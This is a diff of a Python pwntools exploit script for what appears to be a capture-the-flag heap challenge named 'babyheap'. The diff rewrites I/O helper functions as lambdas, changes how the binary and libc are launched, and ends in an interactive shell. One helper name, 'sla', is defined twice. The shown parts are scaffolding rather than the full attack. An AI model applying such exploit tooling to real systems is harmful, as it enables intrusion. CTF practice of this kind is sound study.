@@ -3,25 +3,25 @@ if __name__ == '__main__':
     context.terminal = ['tmux', 'splitw', '-h']  # I always use tmux
     context.log_level = 'debug'
     #-----function for quick script-----#
-    def sl(*args, **kwargs):
-        new_args = [str(_) for _ in args]
-        return ctx.sendline(*new_args, **kwargs)
-    def s(*args, **kwargs):
-        new_args = [str(_) for _ in args]
-        return ctx.send(*new_args, **kwargs)
-    def r(*args, **kwargs):
-        return ctx.recv(*args, **kwargs)
-    def ru(*args, **kwargs):
-        return ctx.recvuntil(*args, **kwargs)
-    def leak(*args, **kwargs):
-        return ctx.leak(*args, **kwargs)
-    def interact(*args, **kwargs):
-        return ctx.interactive(*args, **kwargs)
+    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
+    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
+    st      = lambda delim,data         :ctx.sendthen(str(delim), str(data)) 
+    sl      = lambda data               :ctx.sendline(str(data)) 
+    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
+    sla     = lambda delim,data         :ctx.sendlinethen(str(delim), str(data)) 
+    r       = lambda numb=4096          :ctx.recv(numb)
+    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
+    irt     = lambda                    :ctx.interactive()
+    
+    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
+    leak    = lambda address, count=0   :ctx.leak(address, count)
     def dbg(gdbscript='', *args, **kwargs):
         gdbscript = sym_ctx.gdbscript + gdbscript
         return ctx.debug(gdbscript, *args, **kwargs)
-    def rs(*args, **kwargs):
-        return ctx.start(*args, **kwargs)
+    
+    uu32    = lambda data   :u32(data.ljust(4, '\0'))
+    uu64    = lambda data   :u64(data.ljust(8, '\0'))
+
     
     def alloc(size, content):
         sl(1)
@@ -42,10 +42,9 @@ if __name__ == '__main__':
         
       
     ctx.binary = change_ld('./babyheap', './ld.so')
-    ctx.libc = './libc.so.6'
+    #ctx.libc = './libc.so.6'
     ctx.io_sleep = 0.1
-    rs(env={'LD_PRELOAD':'./libc.so.6'})
-    #rs()
+    rs()
     dbg('c')
 
     alloc(0x28, '\n') #0
@@ -93,7 +92,7 @@ if __name__ == '__main__':
     
     alloc(0x20,'\n')
     
-    interact()
+    irt()
     
     
     
